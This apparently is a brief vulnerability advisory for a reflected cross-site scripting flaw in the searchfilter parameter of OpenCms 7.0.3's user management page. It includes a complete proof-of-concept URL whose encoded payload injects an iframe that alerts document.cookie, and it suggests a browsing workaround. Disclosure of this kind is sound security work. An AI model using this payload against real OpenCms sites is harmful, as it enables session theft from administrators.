Alkacon OpenCms users_list.jsp searchfilter XSS


Product: Alkacon OpenCms 
http://www.opencms.org/


OpenCms contains a cross-site scripting vulnerability in the user management function. Input to parameter searchfilter in page opencms/system/workplace/admin/accounts/users_list.jsp is not sufficiently validated and/or sanitized before it gets embedded in the resulting web page.

Example:
http://(target)/opencms/system/workplace/admin/accounts/users_list.jsp?
ispopup=&action=listsearch&framename=&title=
&closelink=%252Fopencms%252Fopencms%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Faction%253Dinitial%2526path%253D%252Faccounts%252Forgunit
&preactiondone=&dialogtype=&message=&resource=&listaction=&base=&selitems=
&formname=lsu-form&sortcol=&oufqn=&originalparams=&page=&style=new&root=
&path=%252Faccounts%252Forgunit%252Fusers&redirect=
&searchfilter=%3C%2Fscript%3E%3Ciframe+onload%3Dalert%28document.cookie%29%3E%3Cscript%3E
&listSearchFilter=%3C%2Fscript%3E%3Ciframe+onload%3Dalert%28document.cookie%29%3E%3Cscript%3E


The vulnerability has been identified in version 7.0.3. However, other versions may be also affected.


Solution:
Users should not browse untrusted sites while logged into OpenCms.
